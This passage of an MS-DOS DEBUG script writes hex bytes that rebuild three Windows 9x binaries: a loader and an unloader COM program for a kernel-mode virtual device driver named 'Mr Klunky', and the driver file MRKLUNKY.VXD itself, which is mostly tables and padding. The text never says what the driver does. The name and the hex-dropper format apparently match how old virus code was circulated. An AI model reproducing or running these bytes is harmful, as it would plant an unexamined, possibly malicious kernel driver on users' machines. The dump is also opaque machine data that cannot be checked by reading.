E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0300 0E 1F BA B3 00 B4 09 CD 21 B8 84 16 BB 27 00 CD 
E 0310 2F 2E 89 3E 1C 01 2E 8C 06 1E 01 8C C0 0B C7 74 
E 0320 12 BA 0F 01 B8 01 00 2E FF 1E 1C 01 72 05 BA D5 
E 0330 00 EB 78 50 5B BA F4 00 B4 09 CD 21 83 FB 01 75 
E 0340 03 BA 20 01 83 FB 02 75 05 BA 43 01 EB 5D 83 FB 
E 0350 03 75 05 BA 5F 01 EB 53 83 FB 04 75 05 BA 84 01 
E 0360 EB 49 83 FB 05 75 05 BA A3 01 EB 3F 83 FB 06 75 
E 0370 05 BA C9 01 EB 35 83 FB 07 75 05 BA EE 01 EB 2B 
E 0380 83 FB 08 75 05 BA 12 02 EB 21 83 FB 09 75 05 BA 
E 0390 36 02 EB 17 83 FB 0A 75 05 BA 5D 02 EB 0D 83 FB 
E 03A0 0B 75 05 BA 82 02 EB 03 BA A9 02 B4 09 CD 21 B4 
E 03B0 4C CD 21 41 74 74 65 6D 70 74 69 6E 67 20 74 6F 
E 03C0 20 6C 6F 61 64 20 4D 72 20 4B 6C 75 6E 6B 79 2E 
E 03D0 2E 2E 0A 0D 24 53 75 63 63 65 73 73 66 75 6C 6C 
E 03E0 79 20 6C 6F 61 64 65 64 20 4D 72 20 4B 6C 75 6E 
E 03F0 6B 79 21 24 43 6F 75 6C 64 6E 27 74 20 6C 6F 61 
E 0400 64 20 4D 72 20 4B 6C 75 6E 6B 79 21 0A 0D 24 4D 
E 0410 52 4B 4C 55 4E 4B 59 2E 56 58 44 00 00 00 00 00 
E 0420 45 72 72 6F 72 3A 31 20 2D 20 56 58 44 4C 44 52 
E 0430 5F 45 52 52 5F 4F 55 54 5F 4F 46 5F 4D 45 4D 4F 
E 0440 52 59 24 45 72 72 6F 72 3A 32 20 2D 20 56 58 44 
E 0450 4C 44 52 5F 45 52 52 5F 49 4E 5F 44 4F 53 24 45 
E 0460 72 72 6F 72 3A 33 20 2D 20 56 58 44 4C 44 52 5F 
E 0470 45 52 52 5F 46 49 4C 45 5F 4F 50 45 4E 5F 45 52 
E 0480 52 4F 52 24 45 72 72 6F 72 3A 34 20 2D 20 56 58 
E 0490 44 4C 44 52 5F 45 52 52 5F 46 49 4C 45 5F 52 45 
E 04A0 41 44 24 45 72 72 6F 72 3A 35 20 2D 20 56 58 44 
E 04B0 4C 44 52 5F 45 52 52 5F 44 55 50 4C 49 43 41 54 
E 04C0 45 5F 44 45 56 49 43 45 24 45 72 72 6F 72 3A 36 
E 04D0 20 2D 20 56 58 44 4C 44 52 5F 45 52 52 5F 42 41 
E 04E0 44 5F 44 45 56 49 43 45 5F 46 49 4C 45 24 45 72 
E 04F0 72 6F 72 3A 37 20 2D 20 56 58 44 4C 44 52 5F 45 
E 0500 52 52 5F 44 45 56 49 43 45 5F 52 45 46 55 53 45 
E 0510 44 24 45 72 72 6F 72 3A 38 20 2D 20 56 58 44 4C 
E 0520 44 52 5F 45 52 52 5F 4E 4F 5F 53 55 43 48 5F 44 
E 0530 45 56 49 43 45 24 45 72 72 6F 72 3A 39 20 2D 20 
E 0540 56 58 44 4C 44 52 5F 45 52 52 5F 44 45 56 49 43 
E 0550 45 5F 55 4E 4C 4F 41 44 41 42 4C 45 24 45 72 72 
E 0560 6F 72 3A 31 30 20 2D 20 56 58 44 4C 44 52 5F 45 
E 0570 52 52 5F 41 4C 4C 4F 43 5F 56 38 36 5F 41 52 45 
E 0580 41 24 45 72 72 6F 72 3A 31 31 20 2D 20 56 58 44 
E 0590 4C 44 52 5F 45 52 52 5F 42 41 44 5F 41 50 49 5F 
E 05A0 46 55 4E 43 54 49 4F 4E 24 55 6E 6B 6E 6F 77 6E 
E 05B0 20 65 72 72 6F 72 20 6F 63 63 75 72 65 64 21 24 
RCX
04C0
W
N UNLD-MRK.COM
E 0100 4D 5A C5 00 03 00 00 00 20 00 00 00 FF FF 00 00 
E 0110 00 00 00 00 00 00 00 00 3E 00 00 00 01 00 FB 61 
E 0120 6A 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0300 0E 1F BA B6 00 B4 09 CD 21 B8 84 16 BB 27 00 CD 
E 0310 2F 2E 89 3E 21 01 2E 8C 06 23 01 8C C0 0B C7 74 
E 0320 15 B8 02 00 BB FF FF BA 18 01 2E FF 1E 21 01 72 
E 0330 05 BA DA 00 EB 78 50 5B BA FB 00 B4 09 CD 21 83 
E 0340 FB 01 75 03 BA 25 01 83 FB 02 75 05 BA 48 01 EB 
E 0350 5D 83 FB 03 75 05 BA 64 01 EB 53 83 FB 04 75 05 
E 0360 BA 89 01 EB 49 83 FB 05 75 05 BA A8 01 EB 3F 83 
E 0370 FB 06 75 05 BA CE 01 EB 35 83 FB 07 75 05 BA F3 
E 0380 01 EB 2B 83 FB 08 75 05 BA 17 02 EB 21 83 FB 09 
E 0390 75 05 BA 3B 02 EB 17 83 FB 0A 75 05 BA 62 02 EB 
E 03A0 0D 83 FB 0B 75 05 BA 87 02 EB 03 BA AE 02 B4 09 
E 03B0 CD 21 B4 4C CD 21 41 74 74 65 6D 70 74 69 6E 67 
E 03C0 20 74 6F 20 75 6E 6C 6F 61 64 20 4D 72 20 4B 6C 
E 03D0 75 6E 6B 79 2E 2E 2E 0A 0D 24 53 75 63 63 65 73 
E 03E0 73 66 75 6C 6C 79 20 75 6E 6C 6F 61 64 65 64 20 
E 03F0 4D 72 20 4B 6C 75 6E 6B 79 21 24 43 6F 75 6C 64 
E 0400 6E 27 74 20 75 6E 6C 6F 61 64 20 4D 72 20 4B 6C 
E 0410 75 6E 6B 79 21 0A 0D 24 4D 52 4B 4C 55 4E 4B 59 
E 0420 00 00 00 00 00 45 72 72 6F 72 3A 31 20 2D 20 56 
E 0430 58 44 4C 44 52 5F 45 52 52 5F 4F 55 54 5F 4F 46 
E 0440 5F 4D 45 4D 4F 52 59 24 45 72 72 6F 72 3A 32 20 
E 0450 2D 20 56 58 44 4C 44 52 5F 45 52 52 5F 49 4E 5F 
E 0460 44 4F 53 24 45 72 72 6F 72 3A 33 20 2D 20 56 58 
E 0470 44 4C 44 52 5F 45 52 52 5F 46 49 4C 45 5F 4F 50 
E 0480 45 4E 5F 45 52 52 4F 52 24 45 72 72 6F 72 3A 34 
E 0490 20 2D 20 56 58 44 4C 44 52 5F 45 52 52 5F 46 49 
E 04A0 4C 45 5F 52 45 41 44 24 45 72 72 6F 72 3A 35 20 
E 04B0 2D 20 56 58 44 4C 44 52 5F 45 52 52 5F 44 55 50 
E 04C0 4C 49 43 41 54 45 5F 44 45 56 49 43 45 24 45 72 
E 04D0 72 6F 72 3A 36 20 2D 20 56 58 44 4C 44 52 5F 45 
E 04E0 52 52 5F 42 41 44 5F 44 45 56 49 43 45 5F 46 49 
E 04F0 4C 45 24 45 72 72 6F 72 3A 37 20 2D 20 56 58 44 
E 0500 4C 44 52 5F 45 52 52 5F 44 45 56 49 43 45 5F 52 
E 0510 45 46 55 53 45 44 24 45 72 72 6F 72 3A 38 20 2D 
E 0520 20 56 58 44 4C 44 52 5F 45 52 52 5F 4E 4F 5F 53 
E 0530 55 43 48 5F 44 45 56 49 43 45 24 45 72 72 6F 72 
E 0540 3A 39 20 2D 20 56 58 44 4C 44 52 5F 45 52 52 5F 
E 0550 44 45 56 49 43 45 5F 55 4E 4C 4F 41 44 41 42 4C 
E 0560 45 24 45 72 72 6F 72 3A 31 30 20 2D 20 56 58 44 
E 0570 4C 44 52 5F 45 52 52 5F 41 4C 4C 4F 43 5F 56 38 
E 0580 36 5F 41 52 45 41 24 45 72 72 6F 72 3A 31 31 20 
E 0590 2D 20 56 58 44 4C 44 52 5F 45 52 52 5F 42 41 44 
E 05A0 5F 41 50 49 5F 46 55 4E 43 54 49 4F 4E 24 55 6E 
E 05B0 6B 6E 6F 77 6E 20 65 72 72 6F 72 20 6F 63 63 75 
E 05C0 72 65 64 21 24 
RCX
04C5
W
N MRKLUNKY.VXD
E 0100 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 
E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 
E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 
E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 
E 0150 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 
E 0160 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 
E 0170 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 
E 0180 4C 45 00 00 00 00 00 00 02 00 04 00 00 00 00 00 
E 0190 00 80 03 00 06 00 00 00 01 00 00 00 6E 00 00 00 
E 01A0 00 00 00 00 00 00 00 00 00 02 00 00 04 01 00 00 
E 01B0 DA 00 00 00 00 00 00 00 46 00 00 00 00 00 00 00 
E 01C0 C4 00 00 00 01 00 00 00 DC 00 00 00 00 00 00 00 
E 01D0 00 00 00 00 00 00 00 00 F4 00 00 00 00 01 00 00 
E 01E0 00 00 00 00 00 00 00 00 0A 01 00 00 26 01 00 00 
E 01F0 E4 01 00 00 00 00 00 00 E4 01 00 00 00 00 00 00 
E 0200 00 10 00 00 06 00 00 00 04 1B 00 00 1B 00 00 00 
E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0240 0D D0 00 04 04 0B 00 00 00 00 00 00 45 20 00 00 
E 0250 01 00 00 00 06 00 00 00 4C 43 4F 44 00 00 01 00 
E 0260 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 
E 0270 00 00 06 00 08 4D 52 4B 4C 55 4E 4B 59 00 00 00 
E 0280 01 03 01 00 03 00 00 00 00 00 00 00 00 00 44 00 
E 0290 00 00 7C 00 00 00 BE 00 00 00 BE 00 00 00 BE 00 
E 02A0 00 00 BE 00 00 00 27 00 02 01 DD 04 DD 01 EA 01 
E 02B0 07 00 DC 00 01 E2 04 27 00 02 01 D3 01 CD 00 FF 
E 02C0 00 27 00 02 01 DE 04 B6 00 F5 00 07 00 A8 00 01 
E 02D0 5E 08 07 00 A2 00 01 49 08 27 00 02 01 AD 08 89 
E 02E0 00 4E 01 07 00 18 00 01 50 00 07 00 F7 01 01 B5 
E 02F0 04 07 00 EA 01 01 78 07 07 00 BF 01 01 C9 04 07 
E 0300 00 B4 01 01 BD 04 07 00 A2 01 01 C5 04 07 00 8C 
E 0310 01 01 49 08 07 00 87 01 01 C1 04 07 00 0B 00 01 
E 0320 E6 04 07 00 27 01 01 69 05 07 00 A8 00 01 E2 04 
E 0330 07 00 8F 00 01 DD 04 27 00 04 01 E6 04 77 00 84 
E 0340 00 F9 00 47 01 07 00 2C 00 01 DE 04 07 00 26 00 
E 0350 01 49 08 27 00 02 01 C9 04 13 00 32 00 07 00 0D 
E 0360 00 01 74 05 04 00 00 00 06 00 00 00 0C 00 00 00 
E 0370 02 00 00 00 02 00 00 00 02 00 00 00 04 00 00 00 
E 0380 06 00 00 00 08 00 00 00 02 00 00 00 00 00 00 00 
E 0390 02 00 00 00 04 00 00 00 02 00 00 00 04 00 00 00 
E 03A0 02 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 
E 03B0 02 00 00 00 02 00 00 00 02 00 00 00 04 00 00 00 
E 03C0 02 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 
E 03D0 02 00 00 00 02 00 00 00 04 00 00 00 04 00 00 00 
E 03E0 02 00 00 00 00 00 00 00 04 00 00 00 FF FF FF FF 
E 03F0 04 00 00 00 FF FF FF FF 04 00 00 00 FF FF FF FF 
E 0400 04 00 00 00 FF FF FF FF 06 00 00 00 FF FF FF FF 
E 0410 08 00 00 00 FF FF FF FF 08 00 00 00 FF FF FF FF 
E 0420 1A 00 00 00 FF FF FF FF 08 00 00 00 0A 00 00 00 
E 0430 FF FF FF FF 00 00 00 00 08 00 00 00 FF FF FF FF 
E 0440 08 00 00 00 FF FF FF FF 0A 00 00 00 FF FF FF FF 
E 0450 22 00 00 00 FF FF FF FF 0A 00 00 00 0C 00 00 00 
E 0460 FF FF FF FF 00 00 00 00 0A 00 00 00 FF FF FF FF 
E 0470 0A 00 00 00 FF FF FF FF 32 00 00 00 FF FF FF FF 
E 0480 01 00 00 00 00 00 00 00 01 00 00 00 20 12 31 10 
E 0490 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 
E 04A0 05 00 00 00 00 00 00 00 00 E2 30 10 00 00 00 00 
E 04B0 03 00 00 00 00 00 00 00 02 00 00 00 28 12 31 10 
E 04C0 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 
E 04D0 03 00 00 00 30 12 31 10 00 00 00 00 00 00 00 00 
E 04E0 05 00 00 00 00 00 00 00 03 00 00 00 40 12 31 10 
E 04F0 00 00 00 00 00 00 00 00 06 00 00 00 00 00 00 00 
E 0500 01 00 00 00 4C 12 31 10 00 00 00 00 00 00 00 00 
E 0510 07 00 00 00 00 00 00 00 02 00 00 00 50 12 31 10 
E 0520 00 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 
E 0530 02 00 00 00 58 12 31 10 00 00 00 00 00 00 00 00 
E 0540 09 00 00 00 00 00 00 00 04 00 00 00 60 12 31 10 
E 0550 00 00 00 00 00 00 00 00 0A 00 00 00 00 00 00 00 
E 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0570 0B 00 00 00 00 00 00 00 01 00 00 00 70 12 31 10 
E 0580 00 00 00 00 00 00 00 00 0C 00 00 00 00 00 00 00 
E 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 05A0 0D 00 00 00 00 00 00 00 01 00 00 00 74 12 31 10 
E 05B0 00 00 00 00 00 00 00 00 0E 00 00 00 00 00 00 00 
E 05C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 05D0 0F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 05E0 00 00 00 00 00 00 00 00 11 00 00 00 00 00 00 00 
E 05F0 02 00 00 00 78 12 31 10 00 00 00 00 00 00 00 00 
E 0600 12 00 00 00 00 00 00 00 05 00 00 00 00 00 00 00 
E 0610 80 E3 30 10 00 00 00 00 13 00 00 00 00 00 00 00 
E 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0630 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0640 00 00 00 00 00 00 00 00 15 00 00 00 00 00 00 00 
E 0650 06 00 00 00 80 12 31 10 00 00 00 00 00 00 00 00 
E 0660 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0670 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 
E 0680 01 00 00 00 88 12 31 10 00 00 00 00 00 00 00 00 
E 0690 01 02 00 00 00 00 00 00 06 00 00 00 90 12 31 10 
E 06A0 00 00 00 00 00 00 00 00 05 02 00 00 00 00 00 00 
E 06B0 06 00 00 00 98 12 31 10 00 00 00 00 00 00 00 00 
E 06C0 02 02 00 00 00 00 00 00 01 00 00 00 A0 12 31 10 
E 06D0 00 00 00 00 00 00 00 00 03 02 00 00 00 00 00 00 
E 06E0 05 00 00 00 00 00 00 00 F0 E2 30 10 00 00 00 00 
E 06F0 04 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0700 00 00 00 00 00 00 00 00 07 02 00 00 00 00 00 00 
E 0710 05 00 00 00 00 00 00 00 20 E3 30 10 00 00 00 00 
E 0720 06 02 00 00 00 00 00 00 01 00 00 00 A4 12 31 10 
E 0730 00 00 00 00 00 00 00 00 08 02 00 00 00 00 00 00 
E 0740 01 00 00 00 A8 12 31 10 00 00 00 00 00 00 00 00 
E 0750 09 02 00 00 00 00 00 00 01 00 00 00 A8 12 31 10 
E 0760 00 00 00 00 00 00 00 00 0A 02 00 00 00 00 00 00 
E 0770 01 00 00 00 AC 12 31 10 00 00 00 00 00 00 00 00 
E 0780 0B 02 00 00 00 00 00 00 01 00 00 00 AC 12 31 10 
E 0790 00 00 00 00 00 00 00 00 0C 02 00 00 00 00 00 00 
E 07A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 07B0 05 04 00 00 00 00 00 00 01 00 00 00 B0 12 31 10 
E 07C0 00 00 00 00 F0 D9 30 10 00 04 00 00 00 00 00 00 
E 07D0 01 00 00 00 B4 12 31 10 00 00 00 00 00 DA 30 10 
E 07E0 01 04 00 00 00 00 00 00 02 00 00 00 B8 12 31 10 
E 07F0 00 00 00 00 20 DA 30 10 02 04 00 00 00 00 00 00 
E 0800 02 00 00 00 B8 12 31 10 00 00 00 00 20 DA 30 10 
E 0810 0B 04 00 00 00 00 00 00 01 00 00 00 C0 12 31 10 
E 0820 00 00 00 00 40 DA 30 10 04 04 00 00 00 00 00 00 
E 0830 01 00 00 00 C4 12 31 10 00 00 00 00 50 DA 30 10 
E 0840 06 04 00 00 00 00 00 00 01 00 00 00 C8 12 31 10 
E 0850 00 00 00 00 70 DA 30 10 07 04 00 00 00 00 00 00 
E 0860 01 00 00 00 CC 12 31 10 00 00 00 00 90 DA 30 10 
E 0870 0A 04 00 00 00 00 00 00 01 00 00 00 D0 12 31 10 
E 0880 00 00 00 00 B0 DA 30 10 0D 04 00 00 00 00 00 00 
E 0890 01 00 00 00 D4 12 31 10 00 00 00 00 C0 DA 30 10 
E 08A0 08 04 00 00 00 00 00 00 01 00 00 00 D8 12 31 10 
E 08B0 00 00 00 00 D0 DA 30 10 0C 04 00 00 00 00 00 00 
E 08C0 01 00 00 00 DC 12 31 10 00 00 00 00 F0 DA 30 10 
E 08D0 03 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 08E0 00 00 00 00 00 DB 30 10 09 04 00 00 00 00 00 00 
E 08F0 01 00 00 00 E0 12 31 10 00 00 00 00 20 DB 30 10 
E 0900 02 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 
E 0910 00 00 00 00 01 00 00 00 E8 12 31 10 0C 00 00 00 
E 0920 00 00 00 00 00 00 00 00 20 E6 30 10 00 00 00 00 
E 0930 01 00 00 00 F0 12 31 10 03 00 00 00 00 00 00 00 
E 0940 08 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 
E 0950 F8 12 31 10 04 00 00 00 00 00 00 00 06 00 00 00 
E 0960 00 00 00 00 01 00 00 00 01 00 00 00 00 13 31 10 
E 0970 0B 00 00 00 00 00 00 00 06 00 00 00 00 00 00 00 
E 0980 01 00 00 00 01 00 00 00 00 13 31 10 05 00 00 00 
E 0990 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 
E 09A0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 
E 09B0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 
E 09C0 00 00 00 00 09 00 00 00 00 00 00 00 08 00 00 00 
E 09D0 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 
E 09E0 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 09F0 01 00 00 00 00 00 00 00 00 00 00 00 0A 00 00 00 
E 0A00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0A10 00 00 00 00 00 00 00 00 0D 00 00 00 00 00 00 00 
E 0A20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0A30 00 00 00 00 0E 00 00 00 00 00 00 00 00 00 00 00 
E 0A40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0A50 00 01 00 00 00 00 00 00 08 00 00 00 00 00 00 00 
E 0A60 00 00 00 00 01 00 00 00 08 13 31 10 01 01 00 00 
E 0A70 00 00 00 00 0A 00 00 00 00 00 00 00 00 00 00 00 
E 0A80 01 00 00 00 10 13 31 10 02 01 00 00 00 00 00 00 
E 0A90 0A 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 
E 0AA0 18 13 31 10 04 01 00 00 00 00 00 00 1D 00 00 00 
E 0AB0 00 00 00 00 00 00 00 00 01 00 00 00 20 13 31 10 
E 0AC0 05 01 00 00 00 00 00 00 1D 00 00 00 00 00 00 00 
E 0AD0 01 00 00 00 01 00 00 00 20 13 31 10 06 01 00 00 
E 0AE0 00 00 00 00 17 00 00 00 00 00 00 00 01 00 00 00 
E 0AF0 00 00 00 00 00 00 00 00 09 01 00 00 00 00 00 00 
E 0B00 09 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 
E 0B10 00 00 00 00 07 01 00 00 00 00 00 00 12 00 00 00 
E 0B20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0B30 08 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0B40 00 00 00 00 00 00 00 00 00 00 00 00 0A 01 00 00 
E 0B50 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 
E 0B60 00 00 00 00 00 00 00 00 0A 02 00 00 00 00 00 00 
E 0B70 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 
E 0B80 00 00 00 00 0B 01 00 00 00 00 00 00 00 00 00 00 
E 0B90 00 00 00 00 01 00 00 00 02 00 00 00 28 13 31 10 
E 0BA0 0C 01 00 00 00 00 00 00 0A 00 00 00 00 00 00 00 
E 0BB0 00 00 00 00 01 00 00 00 38 13 31 10 00 02 00 00 
E 0BC0 00 00 00 00 0A 00 00 00 00 00 00 00 00 00 00 00 
E 0BD0 01 00 00 00 40 13 31 10 01 02 00 00 00 00 00 00 
E 0BE0 0C 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 
E 0BF0 48 13 31 10 02 02 00 00 00 00 00 00 0C 00 00 00 
E 0C00 00 00 00 00 01 00 00 00 01 00 00 00 48 13 31 10 
E 0C10 03 02 00 00 00 00 00 00 0C 00 00 00 00 00 00 00 
E 0C20 01 00 00 00 01 00 00 00 48 13 31 10 05 02 00 00 
E 0C30 00 00 00 00 25 00 00 00 00 00 00 00 01 00 00 00 
E 0C40 01 00 00 00 50 13 31 10 04 02 00 00 00 00 00 00 
E 0C50 25 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 
E 0C60 50 13 31 10 06 02 00 00 00 00 00 00 19 00 00 00 
E 0C70 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 
E 0C80 09 02 00 00 00 00 00 00 0B 00 00 00 00 00 00 00 
E 0C90 01 00 00 00 00 00 00 00 00 00 00 00 07 02 00 00 
E 0CA0 00 00 00 00 16 00 00 00 00 00 00 00 00 00 00 00 
E 0CB0 00 00 00 00 00 00 00 00 08 02 00 00 00 00 00 00 
E 0CC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0CD0 00 00 00 00 0B 02 00 00 00 00 00 00 00 00 00 00 
E 0CE0 00 00 00 00 01 00 00 00 02 00 00 00 58 13 31 10 
E 0CF0 0C 02 00 00 00 00 00 00 0C 00 00 00 00 00 00 00 
E 0D00 00 00 00 00 01 00 00 00 68 13 31 10 0D 02 00 00 
E 0D10 00 00 00 00 0C 00 00 00 00 00 00 00 00 00 00 00 
E 0D20 01 00 00 00 70 13 31 10 0E 02 00 00 00 00 00 00 
E 0D30 0C 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 
E 0D40 70 13 31 10 01 03 00 00 00 00 00 00 36 00 00 00 
E 0D50 00 00 00 00 01 00 00 00 01 00 00 00 78 13 31 10 
E 0D60 00 03 00 00 00 00 00 00 36 00 00 00 00 00 00 00 
E 0D70 00 00 00 00 01 00 00 00 78 13 31 10 00 04 00 00 
E 0D80 00 00 00 00 00 00 00 00 70 E6 30 10 01 00 00 00 
E 0D90 00 00 00 00 00 00 00 00 03 04 00 00 00 00 00 00 
E 0DA0 00 00 00 00 70 E6 30 10 00 00 00 00 00 00 00 00 
E 0DB0 00 00 00 00 01 04 00 00 00 00 00 00 00 00 00 00 
E 0DC0 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 
E 0DD0 0F 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0DE0 00 00 00 00 00 00 00 00 00 00 00 00 2E 2E 5C 73 
E 0DF0 72 63 5C 63 76 72 5C 74 69 69 2E 63 70 70 00 00 
E 0E00 FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E10 40 10 30 10 80 96 30 10 00 E8 30 10 00 00 00 00 
E 0E20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0E90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0EA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0EB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0EC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0ED0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0EF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
